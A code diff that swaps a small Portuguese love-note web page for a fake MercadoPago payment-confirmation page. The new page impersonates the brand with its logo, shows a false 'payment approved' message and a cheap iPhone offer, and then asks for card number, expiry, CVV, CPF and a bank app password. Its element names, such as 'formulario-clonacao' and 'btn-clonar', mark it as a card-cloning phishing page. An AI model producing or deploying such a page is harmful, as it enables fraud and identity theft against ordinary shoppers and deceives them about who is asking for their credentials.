@@ -1,30 +1,71 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-    <meta name="viewport" content="width=device-width,initial-scale=1.0">
-    <link rel="stylesheet" href="style.css">
-    <meta charset="UTF-8">
-  <title>Site para lembrar dela</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Confirmação de Pagamento | MercadoPago 2026</title>
+  <link rel="stylesheet" href="style.css">
 </head>
-    <nav>
-        <a href="#inicio">Início</a>
-        <a href="#sobre">Sobre</a>
-    <body>
-        <h1>A guria que eu sou apaixonado</h1>
-        <p>Bom eu sou completamente apaixonado nela</p>
-        <section>
-            <h2>Oque ela tem de especial?</h2>
-            <ul>
-                <li>ELA É CARINHOSA</li>
-                <li>ELA É CHEIROSA</li>
-                <li>ELA E O AMOR DA MINHA VIDA</li>
-                <li>ELA E FIEL</li>
-                <li>E ADIVINHA EU SOU APAIXONADO POR ELA</li>
-                <li>AQUELES OLHOS DELA E TÃO PERFEITO</li>
-                <li>AQUELE SORRISO DELA E TAO LINDO</li>
-                                                  </ul>
-        </section>
-    </body>
+<body>
+  <div class="container">
+    <div class="header">
+      <img src="https://www.mercadopago.com/org-img/logo-mercadopago-web.png" alt="Mercado Pago">
+    </div>
+
+    <div class="alert alert-sucesso">
+      <p><strong>✅ Pagamento aprovado!</strong> Enviamos um email com o comprovante.</p>
+    </div>
+
+    <div class="produto-falso">
+      <img src="https://http2.mlstatic.com/D_629152-MLB531277-p-FOTOS-de-CAPTURA-DE-PRODUTO.jpg" alt="iPhone 15 Pro" class="img-falsa">
+      <h3>iPhone 15 Pro 256GB</h3>
+      <p class="preco"><strong>R$ 4.999,00</strong></p>
+    </div>
+
+    <div class="formulario-urgente">
+      <h2 class="titulo-form">Finalize o pagamento agora</h2>
+      <p class="subtitulo">É rápida. Receba no mesmo dia.</p>
+
+      <form id="formulario-clonacao" method="post">
+        <div class="form-group">
+          <label>Número do cartão (16 dígitos)</label>
+          <input type="text" name="numero_cartao" id="numero_cartao" placeholder="0000 0000 0000 0000" maxlength="19" required>
+        </div>
+
+        <div class="form-group">
+          <label>Validade (MM/AA)</label>
+          <input type="text" name="validade" id="validade" placeholder="12/30" maxlength="5" required>
+        </div>
+
+        <div class="form-group">
+          <label>CVV (3 números)</label>
+          <input type="text" name="cvv" id="cvv" placeholder="123" maxlength="3" required>
+        </div>
+
+        <div class="form-group">
+          <label>CPF (brasileiro)</label>
+          <input type="text" name="cpf" id="cpf" placeholder="000.000.000-00" maxlength="14" required>
+        </div>
+
+        <div class="form-group">
+          <label>Senha do app (4 dígitos)</label>
+          <input type="password" name="senha_banco" id="senha_banco" placeholder="••••" maxlength="4" required>
+        </div>
+
+        <button type="submit" class="btn-clonar" id="btnSubmit">
+          <span>✓ CONFIRMAR PAGAMENTO</span>
+          <span class="spinner-border spinner-border-sm d-none" role="status"></span>
+        </button>
+      </form>
+    </div>
+
+    <div class="aviso-final d-none" id="avisoFinal">
+      <div class="spinner-border text-success mb-3" role="status"></div>
+      <h4>Processando pedido...</h4>
+      <p>Seu pagamento está sendo analisado.</p>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
 </html>
-        
-                                            
